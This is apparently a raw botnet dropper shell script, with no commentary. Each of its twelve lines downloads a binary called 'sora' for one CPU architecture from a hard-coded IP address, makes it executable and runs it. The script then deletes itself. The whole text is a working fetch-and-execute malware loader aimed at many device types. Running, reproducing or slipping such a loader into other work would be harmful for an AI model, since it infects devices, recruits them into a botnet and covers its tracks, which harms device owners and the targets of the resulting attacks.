wget  http://88.214.56.195/bins/sora.arm; chmod 777 sora.arm; ./sora.arm android
wget  http://88.214.56.195/bins/sora.arm5; chmod 777 sora.arm5; ./sora.arm5 android
wget  http://88.214.56.195/bins/sora.arm6; chmod 777 sora.arm6; ./sora.arm6 android
wget  http://88.214.56.195/bins/sora.arm7; chmod 777 sora.arm7; ./sora.arm7 android
wget  http://88.214.56.195/bins/sora.m68k; chmod 777 sora.m68k; ./sora.m68k android
wget  http://88.214.56.195/bins/sora.mips; chmod 777 sora.mips; ./sora.mips android
wget  http://88.214.56.195/bins/sora.mpsl; chmod 777 sora.mpsl; ./sora.mpsl android
wget  http://88.214.56.195/bins/sora.ppc; chmod 777 sora.ppc; ./sora.ppc android
wget  http://88.214.56.195/bins/sora.sh4; chmod 777 sora.sh4; ./sora.sh4 android
wget  http://88.214.56.195/bins/sora.spc; chmod 777 sora.spc; ./sora.spc android
wget  http://88.214.56.195/bins/sora.x86; chmod 777 sora.x86; ./sora.x86 android
wget  http://88.214.56.195/bins/sora.x86_64; chmod 777 sora.x86_64; ./sora.x86_64 android

rm $0
